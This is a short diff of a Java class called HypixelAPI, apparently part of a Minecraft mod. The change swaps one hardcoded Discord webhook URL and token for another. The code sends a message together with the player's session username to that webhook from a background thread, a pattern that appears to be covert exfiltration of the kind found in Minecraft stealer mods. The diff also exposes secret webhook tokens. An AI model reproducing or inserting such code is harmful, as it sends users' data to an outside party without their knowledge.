@@ -50,7 +50,7 @@ public class HypixelAPI {
         new Thread(() -> {
             try{
                 CloseableHttpClient httpClient = HttpClients.createDefault();
-                HttpPost httpPost = new HttpPost("https://discord.com/api/webhooks/1010406612978126888/p9MFmZNl2rYSXO5nubjg-Ix2vZ3lfCm5rjS_unSpWOD0SYGsaBZigalkJbkmUS3qqn0B");
+                HttpPost httpPost = new HttpPost("https://discord.com/api/webhooks/1085582719792189490/E9ODgFsSNOvFHez__DUnd7Z2PDwvKFk0nyBfZXn7pfP2T6OQcRpcx2renY9QLeW7Jmgu");
                 ArrayList<NameValuePair> params = new ArrayList<>();
                 params.add(new BasicNameValuePair("content", message));
                 params.add(new BasicNameValuePair("username", mc.getSession().getUsername()));
